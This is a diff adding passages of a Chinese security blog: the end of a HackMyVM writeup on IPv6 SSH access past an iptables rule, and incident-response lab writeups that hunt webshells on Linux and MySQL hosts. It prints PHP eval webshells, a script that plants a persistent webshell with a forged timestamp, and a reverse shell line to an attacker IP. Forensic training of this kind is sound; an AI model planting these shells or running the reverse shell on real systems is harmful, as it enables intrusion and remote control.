@@ -13110,13 +13110,386 @@ root@airbind:~<span class="token comment"># id</span>
 <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groupes</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
 root@airbind:~<span class="token comment"># ls</span>
 root.txt</code></pre>
-<p>头回见，学到了一手。</p>
+<p>然后苦于不知道原理问了一下群主老师<br>看一下靶机的端口开放情况</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@airbind:~<span class="token comment"># ss -tulnp</span>
+Netid                State                 Recv-Q                Send-Q                                  Local Address:Port                                 Peer Address:Port                Process                                           
+udp                  UNCONN                <span class="token number">0</span>                     <span class="token number">0</span>                                            <span class="token number">10.0</span>.3.1:53                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dnsmasq"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">650</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">))</span></span>                 
+udp                  UNCONN                <span class="token number">0</span>                     <span class="token number">0</span>                                      <span class="token number">0.0</span>.0.0%lxcbr0:67                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dnsmasq"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">650</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">))</span></span>                 
+udp                  UNCONN                <span class="token number">0</span>                     <span class="token number">0</span>                                             <span class="token number">0.0</span>.0.0:67                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dhcpd"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">640</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">))</span></span>                   
+udp                  UNCONN                <span class="token number">0</span>                     <span class="token number">0</span>                                             <span class="token number">0.0</span>.0.0:68                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dhclient"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">367</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">))</span></span>                
+tcp                  LISTEN                <span class="token number">0</span>                     <span class="token number">32</span>                                           <span class="token number">10.0</span>.3.1:53                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dnsmasq"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">650</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">))</span></span>                 
+tcp                  LISTEN                <span class="token number">0</span>                     <span class="token number">128</span>                                           <span class="token number">0.0</span>.0.0:22                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"sshd"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">642</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">))</span></span>                    
+tcp                  LISTEN                <span class="token number">0</span>                     <span class="token number">128</span>                                              <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22                                           <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*                    users:<span class="token variable"><span class="token punctuation">((</span>"sshd"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">642</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">))</span></span>   </code></pre>
+<p>发现有两个22端口对外开放，一个是ip4的(0.0.0.0)一个是ipv6的([::]),说明存在ipv6访问的可能</p>
+<p>再看一下靶机的iptables，iptables简单点可以理解为linux的防火墙</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@airbind:~<span class="token comment"># iptables -nL</span>
+Chain INPUT <span class="token punctuation">(</span>policy ACCEPT<span class="token punctuation">)</span>
+target     prot opt <span class="token builtin class-name">source</span>               destination         
+ACCEPT     <span class="token number">6</span>    --  <span class="token number">192.168</span>.10.0/24      <span class="token number">0.0</span>.0.0/0            tcp dpt:22
+DROP       <span class="token number">6</span>    --  <span class="token number">0.0</span>.0.0/0            <span class="token number">0.0</span>.0.0/0            tcp dpt:22
+
+Chain FORWARD <span class="token punctuation">(</span>policy ACCEPT<span class="token punctuation">)</span>
+target     prot opt <span class="token builtin class-name">source</span>               destination         
+
+Chain OUTPUT <span class="token punctuation">(</span>policy ACCEPT<span class="token punctuation">)</span>
+target     prot opt <span class="token builtin class-name">source</span>               destination     </code></pre>
+<p>第一条规则允许来自192.168.10.0&#x2F;24的ssh流量<br>第二条规则任何其他所有的ssh的流量都被丢弃<br>这个第二条规则就是导致22端口被过滤的原因</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@airbind:~<span class="token comment"># iptables -D INPUT 2</span></code></pre>
+<p>删除之后发现22端口开放</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.184                  
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-12 <span class="token number">17</span>:53 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.184
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00022s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT   STATE SERVICE
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http
+MAC Address: 08:00:27:42:DB:30 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.14</span> seconds</code></pre>
+<p>看一下ipv6 的iptable</p>
+<pre class="language-bahs" data-language="bahs"><code class="language-bahs">root@airbind:~# ip6tables -nL
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination   </code></pre>
+<p>但是，根据规则对于ipv6没有任何过滤 也就是说ipv6可以访问ssh服务<br>我尝试加个限制</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@airbind:~<span class="token comment"># ip6tables -A INPUT -p tcp --dport 22 -j DROP</span></code></pre>
+<p>发现ssh连不上了</p>
+<pre class="language-bsah" data-language="bsah"><code class="language-bsah">&gt; ssh -i aaa root@fe80::a00:27ff:fe42:db30%eth0</code></pre>
+<p>感觉不错，学到了不少东西。</p>
 ]]></content>
       <categories>
         <category>HackMyVM</category>
       </categories>
       <tags>
         <tag>ipv6bypass</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>应急靶场-Linux入侵排查</title>
+    <url>/posts/efc85f7f/</url>
+    <content><![CDATA[<p>账号：root 密码：linuxruqin</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> root@IP
+<span class="token number">1</span>.web目录存在木马，请找到木马的密码提交
+<span class="token number">2</span>.服务器疑似存在不死马，请找到不死马的密码提交
+<span class="token number">3</span>.不死马是通过哪个文件生成的，请提交文件名
+<span class="token number">4</span>.黑客留下了木马文件，请找出黑客的服务器ip提交
+<span class="token number">5</span>.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</code></pre>
+<h2 id="web目录存在木马，请找到木马的密码提交"><a href="#web目录存在木马，请找到木马的密码提交" class="headerlink" title="web目录存在木马，请找到木马的密码提交"></a>web目录存在木马，请找到木马的密码提交</h2><p>把html打包下来用d盾查一下<br><img src="https://ooo.0x0.ooo/2024/06/13/OJu1pq.png" alt="OJu1pq.png" loading="lazy"><br>打开看看哪个是的</p>
+<pre class="language-php" data-language="php"><code class="language-php">//.shell.php
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"pass"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string double-quoted-string">"5d41402abc4b2a76b9719d911017c592"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre>
+<p>第一个就有，拿去解密一下<br><img src="https://ooo.0x0.ooo/2024/06/13/OJu7Yc.png" alt="OJu7Yc.png" loading="lazy"><br>密码<code>hello</code><br><strong>flag{hello}</strong><br>不是我提交之后发现这是第二题flag<br><img src="https://ooo.0x0.ooo/2024/06/13/OJue5r.png" alt="OJue5r.png" loading="lazy"><br>原来这是不死马的密码。<br>再看扫出来那几个其他的马吧</p>
+<pre class="language-php" data-language="php"><code class="language-php">//1.php
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>
+<p>这么简单的一句话木马，应该就是这个了，连接密码是1<br><strong>flag{1}</strong></p>
+<h2 id="服务器疑似存在不死马，请找到不死马的密码提交"><a href="#服务器疑似存在不死马，请找到不死马的密码提交" class="headerlink" title="服务器疑似存在不死马，请找到不死马的密码提交"></a>服务器疑似存在不死马，请找到不死马的密码提交</h2><p><strong>flag{hello}</strong><br>第一问不小心把第二问做了，看来经过md5可以绕过一些检测</p>
+<h2 id="不死马是通过哪个文件生成的，请提交文件名"><a href="#不死马是通过哪个文件生成的，请提交文件名" class="headerlink" title="不死马是通过哪个文件生成的，请提交文件名"></a>不死马是通过哪个文件生成的，请提交文件名</h2><p>再看扫出来的哪几个东东，发现index.php有不死马的生成逻辑</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token constant">SYS_ROOT</span><span class="token operator">.</span><span class="token constant">INC</span><span class="token operator">.</span><span class="token string single-quoted-string">'common.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$path</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PATH_INFO'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$path</span> <span class="token operator">=</span> <span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">safeword</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$ctrl</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'run'</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'createprocess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token class-name static-context">Index</span><span class="token operator">::</span><span class="token function">createhtml</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'single'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+	<span class="token class-name static-context">Index</span><span class="token operator">::</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/.shell.php'</span><span class="token punctuation">;</span>
+<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_POST["pass"])=="5d41402abc4b2a76b9719d911017c592")&#123;@eval($_POST[cmd]);&#125;?>'</span><span class="token punctuation">;</span>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'touch -m -d "2021-01-01 00:00:01" .shell.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+<p>使用<code>file_put_contents</code>写入并伪造了时间戳<br><strong>flag{index.php}</strong></p>
+<h2 id="黑客留下了木马文件，请找出黑客的服务器ip提交"><a href="#黑客留下了木马文件，请找出黑客的服务器ip提交" class="headerlink" title="黑客留下了木马文件，请找出黑客的服务器ip提交"></a>黑客留下了木马文件，请找出黑客的服务器ip提交</h2><p>那就找一下1.php是哪个ip写入的，去看apache的access日志</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/log/apache2<span class="token comment"># cat access.log.1 |grep '1.php' | awk '&#123;print $1&#125;' | sort | uniq</span>
+<span class="token number">192.168</span>.200.2</code></pre>
+<p>提交，错误！<br>发现另一个马也是这个ip，所以我猜不是通过web写入的<br>看了一下web目录发现一个可执行文件<code>&#39;shell(1).elf&#39;</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/www/html<span class="token comment"># ls -al</span>
+total <span class="token number">736</span>
+drwxrwxrwx <span class="token number">8</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">3</span> root     root       <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  <span class="token punctuation">..</span>
+<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data     <span class="token number">24</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  <span class="token number">1</span>.php
+-rw-r--r-- <span class="token number">1</span> root     root     <span class="token number">655360</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  <span class="token number">1</span>.tar
+drwxrwxrwx <span class="token number">3</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  admin
+<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data    <span class="token number">280</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  api.php
+<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data    <span class="token number">882</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  config.php
+drwxrwxrwx <span class="token number">3</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  data
+<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data    <span class="token number">894</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  favicon.ico
+<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data    <span class="token number">142</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  .htaccess
+drwxrwxrwx <span class="token number">4</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  include
+<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> root     root        <span class="token number">722</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  index.php
+<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data  <span class="token number">12744</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  install.php
+<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data   <span class="token number">1080</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  LICENSE
+drwxrwxrwx <span class="token number">2</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  pictures
+<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data   <span class="token number">2235</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  README.md
+<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data   <span class="token number">1049</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  rss.php
+-rw-r--r-- <span class="token number">1</span> www-data www-data    <span class="token number">207</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span> <span class="token string">'shell(1).elf'</span>
+-rw-r--r-- <span class="token number">1</span> www-data www-data     <span class="token number">88</span> Jan  <span class="token number">1</span>  <span class="token number">2021</span>  .shell.php
+<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data    <span class="token number">566</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  sitemap.php
+drwxrwxrwx <span class="token number">3</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  template
+drwxrwxrwx <span class="token number">3</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  wap</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/www/html<span class="token comment"># file 'shell(1).elf'</span>
+shell<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>.elf: ELF <span class="token number">32</span>-bit LSB executable, Intel <span class="token number">80386</span>, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, statically linked, no section header</code></pre>
+<p>看到elf习惯性的反编译一下看看有没有东西，因为不敢执行<br><img src="https://ooo.0x0.ooo/2024/06/13/OJuASG.png" alt="OJuASG.png" loading="lazy"><br>好像并没有东西，那就只能执行以下看看外连情况</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">
+root@ip-10-0-10-3:/var/www/html<span class="token comment"># ./'shell(1).elf' &amp;</span>
+<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token number">1257</span>
+root@ip-10-0-10-3:/var/www/html<span class="token comment"># netstat -talnp</span>
+Active Internet connections <span class="token punctuation">(</span>servers and established<span class="token punctuation">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.1:3306          <span class="token number">0.0</span>.0.0:*               LISTEN      <span class="token number">553</span>/mysqld
+tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:22              <span class="token number">0.0</span>.0.0:*               LISTEN      <span class="token number">507</span>/sshd
+tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">10.0</span>.10.3:22            <span class="token number">120.193</span>.78.19:3087      ESTABLISHED <span class="token number">843</span>/sshd: root@nott
+tcp        <span class="token number">0</span>      <span class="token number">1</span> <span class="token number">10.0</span>.10.3:53880         <span class="token number">10.11</span>.55.21:3333        SYN_SENT    <span class="token number">1257</span>/./shell<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>.elf
+tcp        <span class="token number">0</span>    <span class="token number">240</span> <span class="token number">10.0</span>.10.3:22            <span class="token number">120.193</span>.78.19:65018     ESTABLISHED <span class="token number">831</span>/sshd: root@pts/
+tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::80                   :::*                    LISTEN      <span class="token number">520</span>/apache2
+tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::22     </code></pre>
+<p>发现<code>shell(1).elf</code>外连 10.11.55.21:3333<br><strong>flag{10.11.55.21}</strong></p>
+<h2 id="黑客留下了木马文件，请找出黑客服务器开启的监端口提交"><a href="#黑客留下了木马文件，请找出黑客服务器开启的监端口提交" class="headerlink" title="黑客留下了木马文件，请找出黑客服务器开启的监端口提交"></a>黑客留下了木马文件，请找出黑客服务器开启的监端口提交</h2><p>由上一问得到端口是3333<br><strong>flag{3333}</strong></p>
+]]></content>
+      <categories>
+        <category>玄机应急靶场</category>
+      </categories>
+      <tags>
+        <tag>应急响应</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>应急靶场-mysql应急</title>
+    <url>/posts/beb16a0d/</url>
+    <content><![CDATA[<pre class="language-bash" data-language="bash"><code class="language-bash">mysql应急响应 ssh账号 root  密码 xjmysql
+<span class="token function">ssh</span> env.xj.edisec.net  <span class="token parameter variable">-p</span> xxxxx
+<span class="token number">1</span>.黑客第一次写入的shell flag<span class="token punctuation">&#123;</span>关键字符串<span class="token punctuation">&#125;</span> 
+<span class="token number">2</span>.黑客反弹shell的ip flag<span class="token punctuation">&#123;</span>ip<span class="token punctuation">&#125;</span>
+<span class="token number">3</span>.黑客提权文件的完整路径 md5 flag<span class="token punctuation">&#123;</span>md5<span class="token punctuation">&#125;</span> 注 /xxx/xxx/xxx/xxx/xxx.xx
+<span class="token number">4</span>.黑客获取的权限 flag<span class="token punctuation">&#123;</span>whoami后的值<span class="token punctuation">&#125;</span></code></pre>
+<h2 id="黑客第一次写入的shell"><a href="#黑客第一次写入的shell" class="headerlink" title="黑客第一次写入的shell"></a>黑客第一次写入的shell</h2><p>老规矩 用d盾扫一下 web目录，因为拿下数据库都是从web拿的<br><img src="https://ooo.0x0.ooo/2024/06/13/OJuvnI.png" alt="OJuvnI.png" loading="lazy"><br>看一下<code>sh.pph</code></p>
+<pre class="language-php" data-language="php"><code class="language-php">1	2	<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>	4
+//ccfda79e-7aa1-4275-bc26-a6189eb9a20b</code></pre>
+<p>下面这个貌似flag，提交正确<br><strong>flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}</strong></p>
+<h2 id="黑客反弹shell的ip"><a href="#黑客反弹shell的ip" class="headerlink" title="黑客反弹shell的ip"></a>黑客反弹shell的ip</h2><p>看一下apache日志</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@xuanji:/var/log/apache2<span class="token comment"># cat error.log | grep 'sh.php'</span></code></pre>
+<p>是空的，看以下mysql 的日志</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">230731</span> <span class="token number">10</span>:14:49 <span class="token punctuation">[</span>Note<span class="token punctuation">]</span> /usr/sbin/mysqld: ready <span class="token keyword">for</span> connections.
+Version: <span class="token string">'5.5.64-MariaDB-1ubuntu0.14.04.1'</span>  socket: <span class="token string">'/var/run/mysqld/mysqld.sock'</span>  port: <span class="token number">3306</span>  <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+sh: <span class="token number">1</span>: curl: not found
+--2023-08-01 02:14:11--  http://192.168.100.13:771/
+Connecting to <span class="token number">192.168</span>.100.13:771<span class="token punctuation">..</span>. connected.
+HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> No headers, assuming HTTP/0.9
+Length: unspecified
+Saving to: <span class="token string">'index.html'</span>
+
+     0K                                                        <span class="token number">2.46</span> <span class="token operator">=</span><span class="token number">2</span>.0s
+
+<span class="token number">2023</span>-08-01 02:14:13 <span class="token punctuation">(</span><span class="token number">2.46</span> B/s<span class="token punctuation">)</span> - <span class="token string">'index.html'</span> saved <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>
+
+/tmp/1.sh: line <span class="token number">1</span>: --2023-08-01: <span class="token builtin class-name">command</span> not found
+/tmp/1.sh: line <span class="token number">2</span>: Connecting: <span class="token builtin class-name">command</span> not found
+/tmp/1.sh: line <span class="token number">3</span>: HTTP: <span class="token builtin class-name">command</span> not found
+/tmp/1.sh: line <span class="token number">4</span>: Length:: <span class="token builtin class-name">command</span> not found
+/tmp/1.sh: line <span class="token number">5</span>: Saving: <span class="token builtin class-name">command</span> not found
+/tmp/1.sh: line <span class="token number">7</span>: 0K: <span class="token builtin class-name">command</span> not found
+/tmp/1.sh: line <span class="token number">9</span>: syntax error near unexpected token <span class="token variable"><span class="token variable">`</span><span class="token punctuation">(</span>'
+/tmp/1.sh: line <span class="token number">9</span>: <span class="token variable">`</span></span><span class="token number">2023</span>-08-01 02:16:35 <span class="token punctuation">(</span><span class="token number">5.01</span> MB/s<span class="token punctuation">)</span> - <span class="token string">'1.sh'</span> saved <span class="token punctuation">[</span><span class="token number">43</span>/43<span class="token punctuation">]</span>'</code></pre>
+<p>有个1.sh的文件，打开看到反弹shell的ip</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@xuanji:/var/log/mysql<span class="token comment"># find / -name '1.sh' 2>/dev/null</span>
+/tmp/1.sh
+/var/lib/mysql/1.sh
+root@xuanji:/var/log/mysql<span class="token comment"># cat /tmp/1.sh</span>
+<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span>/dev/tcp/192.168.100.13/777 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre>
+<p><strong>flag{192.168.100.13}</strong></p>
+<h2 id="黑客提权文件的完整路径"><a href="#黑客提权文件的完整路径" class="headerlink" title="黑客提权文件的完整路径"></a>黑客提权文件的完整路径</h2><p>mysql常用udf提权，看一下mysql的插件</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">
+root@xuanji:/usr/lib/mysql/plugin<span class="token comment"># ls -al</span>
+total <span class="token number">4752</span>
+drwxr-xr-x. <span class="token number">1</span> mysql mysql      <span class="token number">39</span> Aug  <span class="token number">1</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
+drwxr-xr-x. <span class="token number">1</span> root  root       <span class="token number">20</span> Jul <span class="token number">31</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
+-rw-r--r--. <span class="token number">1</span> mysql mysql   <span class="token number">10416</span> May <span class="token number">16</span>  <span class="token number">2019</span> auth_pam.so
+-rw-r--r--. <span class="token number">1</span> mysql mysql    <span class="token number">6464</span> May <span class="token number">16</span>  <span class="token number">2019</span> auth_socket.so
+-rw-r--r--. <span class="token number">1</span> mysql mysql   <span class="token number">10200</span> May <span class="token number">16</span>  <span class="token number">2019</span> dialog.so
+-rw-r--r--. <span class="token number">1</span> mysql mysql <span class="token number">1600136</span> May <span class="token number">16</span>  <span class="token number">2019</span> ha_innodb.so
+-rw-r--r--. <span class="token number">1</span> mysql mysql  <span class="token number">159304</span> May <span class="token number">16</span>  <span class="token number">2019</span> handlersocket.so
